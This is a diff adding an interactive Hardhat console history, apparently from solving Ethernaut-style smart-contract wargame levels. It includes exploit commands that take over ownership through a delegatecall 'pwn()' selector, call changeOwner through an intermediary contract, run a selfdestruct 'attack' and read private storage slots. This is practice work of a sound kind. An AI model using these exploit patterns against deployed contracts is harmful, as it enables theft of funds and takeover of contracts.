@@ -1,3 +1,283 @@
+await web3.eth.getStorageAt('0xbDF92b61bf5Aead940FA35E043a016a3550B909E',4)
+await web3.eth.getStorageAt('0xbDF92b61bf5Aead940FA35E043a016a3550B909E',3)
+await web3.eth.getStorageAt('0xbDF92b61bf5Aead940FA35E043a016a3550B909E',2)
+await web3.eth.getStorageAt('0xbDF92b61bf5Aead940FA35E043a016a3550B909E',1)
+await web3.eth.getStorageAt('0xbDF92b61bf5Aead940FA35E043a016a3550B909E',11)
+await web3.eth.getStorageAt('0xbDF92b61bf5Aead940FA35E043a016a3550B909E',12)
+await web3.eth.getStorageAt('0xbDF92b61bf5Aead940FA35E043a016a3550B909E',14)
+await web3.eth.getStorageAt('0xbDF92b61bf5Aead940FA35E043a016a3550B909E',10)
+await web3.eth.getStorageAt('0xbDF92b61bf5Aead940FA35E043a016a3550B909E',11)
+await web3.eth.getStorageAt('0xbDF92b61bf5Aead940FA35E043a016a3550B909E',13)
+ca = await ethers.getContractAt('StandardTokenWithAntibot','0xbDF92b61bf5Aead940FA35E043a016a3550B909E', await ethers.getSigner())
+ca = await ethers.getContractAt('cabi','0xbDF92b61bf5Aead940FA35E043a016a3550B909E', await ethers.getSigner())
+ca = await ethers.getContractAt('StandardTokenWithAntibot','0xbDF92b61bf5Aead940FA35E043a016a3550B909E', await ethers.getSigner())
+ca = await ethers.getContractAt('StandardTokenWithAntibot','0xbDF92b61bf5Aead940FA35E043a016a3550B909E')
+ca = await ethers.getContractAt('','0xbDF92b61bf5Aead940FA35E043a016a3550B909E')
+let ca = await ethers.getContractAt('','0xbDF92b61bf5Aead940FA35E043a016a3550B909E')
+let ca = await web3.eth.getContractAt('','0xbDF92b61bf5Aead940FA35E043a016a3550B909E')
+await web3.eth.getStorageAt('0xbDF92b61bf5Aead940FA35E043a016a3550B909E',4)
+await web3.eth.getStorageAt('0xbDF92b61bf5Aead940FA35E043a016a3550B909E',3)
+await web3.eth.getStorageAt('0xbDF92b61bf5Aead940FA35E043a016a3550B909E',2)
+await web3.eth.getStorageAt('0xbDF92b61bf5Aead940FA35E043a016a3550B909E',1)
+await web3.eth.getStorageAt('0xbDF92b61bf5Aead940FA35E043a016a3550B909E',0)
+await web3.eth.getStorageAt('0xbDF92b61bf5Aead940FA35E043a016a3550B909E',3)
+await web3.eth.getStorageAt('0xbDF92b61bf5Aead940FA35E043a016a3550B909E',2)
+await web3.eth.getStorageAt('0xbDF92b61bf5Aead940FA35E043a016a3550B909E',1)
+await web3.eth.getStorageAt('0xbDF92b61bf5Aead940FA35E043a016a3550B909E',0)
+await web3.eth.getStorageAt('0xbDF92b61bf5Aead940FA35E043a016a3550B909E',3)
+await web3.eth.getStorageAt('0xbDF92b61bf5Aead940FA35E043a016a3550B909E',4)
+await web3.eth.getStorageAt('0xbDF92b61bf5Aead940FA35E043a016a3550B909E',1)
+await web3.eth.getStorageAt('0xbDF92b61bf5Aead940FA35E043a016a3550B909E',2)
+await web3.eth.getStorageAt('0xbDF92b61bf5Aead940FA35E043a016a3550B909E',0)
+await web3.eth.getStorageAt('0xbDF92b61bf5Aead940FA35E043a016a3550B909E',2)
+await web3.eth.getStorageAt('0xbDF92b61bf5Aead940FA35E043a016a3550B909E',6)
+await web3.eth.getStorageAt('0xbDF92b61bf5Aead940FA35E043a016a3550B909E',3)
+await web3.eth.getStorageAt('0xbDF92b61bf5Aead940FA35E043a016a3550B909E',2)
+await web3.eth.getStorageAt('0xc886bB58A9eF8F390296Cb8ad0529C0F00B13155',1)
+await helpers.getStorageAt('0xbDF92b61bf5Aead940FA35E043a016a3550B909E',2)
+await web3.eth.getStorageAt('0xc886bB58A9eF8F390296Cb8ad0529C0F00B13155',1)
+await web3.eth.getStorageAt('0xc886bB58A9eF8F390296Cb8ad0529C0F00B13155',0)
+await getStorageAt('0xc886bB58A9eF8F390296Cb8ad0529C0F00B13155',0)
+const { getStorageAt } = require("@nomicfoundation/hardhat-network-helpers");
+helpers
+await helpers.getStorageAt('0xc886bB58A9eF8F390296Cb8ad0529C0F00B13155',0)
+const { helpers } = require("@nomicfoundation/hardhat-network-helpers");
+import {helpers} from "@nomicfoundation/hardhat-network-helpers";
+helpers.g
+await ethers.getStorageAt('0xc886bB58A9eF8F390296Cb8ad0529C0F00B13155',0)
+await caa.connect(await ethers.getSigner()).attack({value: ethers.utils.parseEther("0.001")});
+caa.connect(await ethers.getSigner()).attack({value: ethers.utils.parseEther("0.001")});
+caa.connect(await ethers.getSigner()).attack({value: ethers.utils.parseEthers("0.001")});
+caa.connect(await ethers.getSigner()).attack({value: '0.01 ethers'});
+caa.connect(await ethers.getSigner()).attack({value: 0.01 ethers});
+caa.connect(await ethers.getSigner()).attack({value: 0.01});
+caa.connect(await ethers.getSigner()).attack({value: '0.01'});
+caa.connect(ethers.getSigner()).attack({value: 0.01});
+let caa = await ca.attach('0x8878b6f3E6DAFc5a95cE5050CFc544c815Bc0096');
+let ca = await ethers.getContractFactory('selfdes');
+let caa = await ethers.getContractFactory('selfdes');
+let caa = await ethers.getContractFactory('selfdes')
+await acc.sendTransaction({to: delegationCa.address, data:'0xdd365b8b', gasLimit: '100000'});
+await acc.sendTransaction({to: delegationCa.address, data:'0xdd365b8b', gaslimit: '100000'});
+await acc.sendTransaction({to: delegationCa.address, data:'0xdd365b8b'});
+delegationCa = await delegation.attach('0x3A01562eD47BC9c622a99A8a8541097dD8E3903B')
+let delegation = await ethers.getContractFactory('Delegation')
+let delegationCa = await delegation.attach('0x3A01562eD47BC9c622a99A8a8541097dD8E3903B')
+delegationCa = await delegation.attach('0x3A01562eD47BC9c622a99A8a8541097dD8E3903B')
+await delegateCa.connect(acc).pwn()
+delegateCa = await delegate.attach('0x3A01562eD47BC9c622a99A8a8541097dD8E3903B')
+await delegateCa.connect(acc).pwn()
+let acc = await ethers.getSigner()
+let delegateCa = await delegate.attach('0x1c42E620E8a8263dA8E1a52273cD7329C3F48529')
+let delegate = await ethers.getContractFactory('Delegate')
+await delegateCa.owner()
+await delegateCa.connect(accounts[1]).pwn()
+await delegationCa.connect(accounts[1]).pwn()
+await delegation.connect(accounts[1]).pwn()
+accounts[1].address
+await delegation.accounts[1].pwn()
+let accounts = await ethers.getSigners()
+let delegationCa = await delegation.attach('0x59b670e9fA9D0A427751Af201D676719a970857b')
+let delegation = await ethers.getContractFactory('Delegation')
+await delegateCa.owner()
+await (delegateCa.owner()).address
+await delegateCa.owner().address
+delegate.owner()
+await delegate.owner()
+await delegate.owner
+await delegate.owner.address
+await (delegate.owner).address
+await (delegate.owner()).address
+let delegateCa = await delegate.attach('0xc6e7DF5E7b4f2A278906862b61205850344D4e7d')
+let delegate = await ethers.getContractFactory('Delegate')
+await delegateCa.owner()
+await accounts[1].sendTransaction({to: '0x0B306BF915C4d645ff596e518fAf3F9669b97016', data:'0xdd365b8b'})
+accounts[1].address
+await delegateCa.owner()
+await accounts[1].sendTransaction({to: '0x959922bE3CAee4b8Cd9a407cc3ac1C251C2007B1', data:'0xdd365b8b'})
+await delegateCa.owner()
+await delegateCa.owner
+delegateCa.owner
+let delegateCa = await delegate.attach('0x959922bE3CAee4b8Cd9a407cc3ac1C251C2007B1')
+await delegationCa.owner()
+await accounts[1].sendTransaction({to: '0x959922bE3CAee4b8Cd9a407cc3ac1C251C2007B1', data:'0xdd365b8b'})
+accounts[0].address
+let accounts = await ethers.getSigners()
+accounts[0]
+accounts[0}
+await delegationCa.owner()
+delegationCa.owner()
+delegationCa.owner
+await (delegationCa.owner).address
+await (delegationCa.owner()).address
+let delegationCa = await delegation.deploy('0x0B306BF915C4d645ff596e518fAf3F9669b97016')
+delegate = await ethers.getContractFactory('Delegate')
+let delegate = await ethers.getContractFactory('Delegate')
+let delegate = await ethers.getContractFactors('Delegate')
+let delegation = await ethers.getContractFactory('Delegation')
+await sign.sendTransaction({to: '0x123BDbeF93EB4D479258CDE1dbfd02144Cd4Fa26', data: '0xdd365b8b'});
+sign
+let sign = await ethers.getSigner()
+await ethers.getSigner().sendTransaction({to: '0x123BDbeF93EB4D479258CDE1dbfd02144Cd4Fa26', data: '0xdd365b8b'});
+deca
+de = await deca.delegate()
+de
+de = await deca.delegate
+de
+let de = deca.delegate
+await deca.delegate
+await deca.delegate()
+await deca.delegate().address
+await deca.delegate.address
+let deca = await delegation.attach('0x123BDbeF93EB4D479258CDE1dbfd02144Cd4Fa26')
+let delegation = await ethers.getContractFactory('Delegation')
+await acc.sendTransaction({data:'0xdd365b8b', gasLimit: '210000', to: '0x123BDbeF93EB4D479258CDE1dbfd02144Cd4Fa26'});
+await acc.sendTransaction({data:'0xdd365b8b', gasLimit: '21000'
+await acc.sendTransaction({data:'0xdd365b8b', gasLimit: '21000', to: '0x123BDbeF93EB4D479258CDE1dbfd02144Cd4Fa26'});
+await acc.sendTransaction({data:'0xdd365b8b', gasLimit: { BigNumber: '21000'}, to: '0x123BDbeF93EB4D479258CDE1dbfd02144Cd4Fa26'});
+await acc.sendTransaction({to: '0x123BDbeF93EB4D479258CDE1dbfd02144Cd4Fa26', data:'0xdd365b8b', gasLimit: { BigNumber: '21000'}});
+await acc.sendTransaction({to: '0x123BDbeF93EB4D479258CDE1dbfd02144Cd4Fa26', data:'0xdd365b8b', gasLimit: { BigNumber: "21000"}});
+await acc.sendTransaction({to: '0x123BDbeF93EB4D479258CDE1dbfd02144Cd4Fa26', data:'0xdd365b8b'});
+await acc.sendTransaction({to: '0x1c42E620E8a8263dA8E1a52273cD7329C3F48529', data:'0xdd365b8b'});
+acc.address
+acc = await ethers.getSigner()
+let acc = await ethers.getSigner()
+await ethers.getSigner().address
+await ethers.getSigner()
+ethers.getSigner()
+acc
+acc.address
+let acc =await  ethers.getSigner().address
+await acc = ethers.getSigner().address
+await ethers.getSigner().address
+await ethers.getSigner()
+await ethers.getSigner().address
+ethers.getSinger().address
+accounts[1].address
+accounts[1]
+await delegateCa.owner()
+await delegateCa.owner
+delegateCa.owner
+delegateCa.owner().address
+await delegateCa.owner().address
+delegateCa.owner.address
+delegateCa.address
+await accounts[1].sendTransaction({to: delegateCa.address, data: '0xdd365b8b'});
+accounts[1].sendTransaction({to: delegateCa.address, data: '0xdd365b8b'});
+;
+await delegationDeployed.connect(accounts[1]).
+await delegationDeployed.connect(accounts[1]).sendTransaction({data: '0xdd365b8b'})
+await delegationDeployed.connect(accounts[1]).({data: '0xdd365b8b'})
+await delegationDeployed.connect(accounts[1]).pwn('0xdd365b8b');
+await delegationDeployed.connect(accounts[1]).pwn();
+delegationDeployed = await delegation.deploy('0x0B306BF915C4d645ff596e518fAf3F9669b97016')
+delegationDeployed
+await delegationDeployed.connect(accounts[1]).pwn();
+delegationDeployed.connect(accounts[1].address).pwn();
+let delegationDeployed = delegation.deploy('0x0B306BF915C4d645ff596e518fAf3F9669b97016')
+let delegateCa = await delegate.attach
+accounts[2].address
+accounts[1].address
+accounts[1]
+accounts = await ethers.getSigners()
+let accounts = await ethers.getSingers
+let accounts = await ethers.getSingers();
+let delegateCa = await delegate.attach('0x0B306BF915C4d645ff596e518fAf3F9669b97016')
+let delegationCa = await delegation.attach('0x959922bE3CAee4b8Cd9a407cc3ac1C251C2007B1')
+let delegate = await ethers.getContractFactory('Delegate')
+let delegation = await ethers.getContractFactory('Delegation')
+delegate = await ethers.getContractFactory('Delegation');
+let delegate = await ethers.getContractFactory('Delegation');
+delegate = await ethers.getContractFactory('Delegate');
+let delegate = await ethers.getContractFactory('Delegate');
+let delegate = await ethers.getContractFactory('Delegate')
+await ownerChanger.connect(await ethers.getSigner()).changeOwner('0x0cbae4D4b1a5C4d241019125924b974949ae6530')
+await ownerChanger.connect(ethers.getSigner()).changeOwner('0x0cbae4D4b1a5C4d241019125924b974949ae6530')
+let ownerChanger = await OwnerChanger.attach('0x9c3576C0df339F9dAC9d93f810c70e5b7B5FE161')
+const OwnerChanger = await ethers.getContractFactory('OwnerChanger')
+await ca
+await ca.telephoneContract()
+await ca
+await ca.telephoneContract().address
+await ca.telephoneContract.address
+addy
+addy = await ca.telephoneContract.address
+addy
+let addy = ca.telephoneContract.address
+await ca.telephoneContract.address
+await ca.telephoneContract.address()
+await ca.connect(await ethers.getSigner()).changeOwner('0x0cbae4D4b1a5C4d241019125924b974949ae6530')
+await ca.telephoneContract().address
+await ca.telephoneContract();
+await ca.connect(await ethers.getSigner()).changeOwner('0x0cbae4D4b1a5C4d241019125924b974949ae6530')
+ca = await inst.attach('0xb83762c04cf2d732a0211e13ec70b5e413ae0f1d')
+await ca
+await ca.connect(await ethers.getSigner()).changeOwner('0x0cbae4D4b1a5C4d241019125924b974949ae6530')
+ca = await inst.attach('0x4810995fe61416965ed2ebc9147b31d4a04af42d')
+ca = await inst.attahch('0x4810995fe61416965ed2ebc9147b31d4a04af42d')
+await ca.connect(await ethers.getSigner()).changeOwner('0x0cbae4D4b1a5C4d241019125924b974949ae6530')
+let acc = await ethers.getSigner()
+ca = await inst.attach('0xB83762C04CF2D732a0211e13eC70B5e413ae0f1d')
+const ca = await inst.attahch('0xB83762C04CF2D732a0211e13eC70B5e413ae0f1d')
+inst = await ethers.getContractFactory('OwnerChanger')
+const inst = await ethers.getContractFactory('OwnerChanger')
+const inst = await ethers.getContractFactory('ownerchanger')
+await ca.connect(await ethers.getSigner()).flip()
+acc.address
+await ca.connect(await ethers.getSigner()).flip()
+acc.address
+let acc = await ethers.getSigner()
+await ethers.getSigner().address()
+await ethers.getSigner().address
+await ethers.getSigner()
+console.log(ethers.signer)
+ethers.signers
+ethers.signer
+accounts;
+accounts
+ca = await inst.attach('0x84564Bf6Bfc86071ac25f6a3D651128246494D7f')
+const ca = await inst.attahch('0x84564Bf6Bfc86071ac25f6a3D651128246494D7f')
+const inst = await ethers.getContractFactory('CoinFlipper')
+await ca.flip(true)
+await ca.flip("true")
+const ca = await Flip.attach("0x0165878A594ca255338adfa4d48449f69242Eb8F")
+const Flip = await ethers.getContractFactory('CoinFlip')
+await ca.connect(acc1).withdraw();
+await ca.owner()
+await ca.owner
+await acc1.sendTransaction({to: ca.address, value: '1'});
+await acc1.sendTransaction({to: ca, value: '1'});
+acc1.send('1')
+ca.send({value: '1'})
+ca.connect(acc1).send({value: '1'})
+ca.connect(acc1).receive('1')
+ca.connect(acc1).send('1')
+await ca.connect(acc1).send('1')
+await ca.connect(acc1).getContribution()
+await ca.connect(acc1).contribute({value: 1})
+await ca.connect(acc1).getContribution()
+await ca.connect(add1).getContribution()
+await ca.connect(addr1).getContribution()
+await ca.getContribution({from: acc1})
+await ca.getContribution({from: acc1.address})
+await ca.getContribution({from: acc1})
+await ca.getContribution({from: acc1$})
+await ca.getContribution({from: acc1)
+acc1
+const [owner, acc1, acc2] = await ethers.getSigners()
+accounts = await ethers.getAccounts()
+let accounts = await ethers.getAccounts()
+let accounts = await web3.eth.getAccounts()
+await ca.getContribution({from: accounts[0]})
+await ca.getContribution({from: accounts[0])
+await ca.getContribution()
+await ca.owner()
+help()
+ca
+const ca = await cainstance.attach('0xcf7ed3acca5a467e9e704c703e8d87f634fb0fc9')
+cainstance = await ethers.getContractFactory('Fallback');
+const cainstance = await ethers.getContractFactory('Fallback');
+const cainstance = await ethers.getConractFactory('Fallback');
 await inn.getCleared()
 await inn.authenticate("abcde")
 await inn.getCleared()
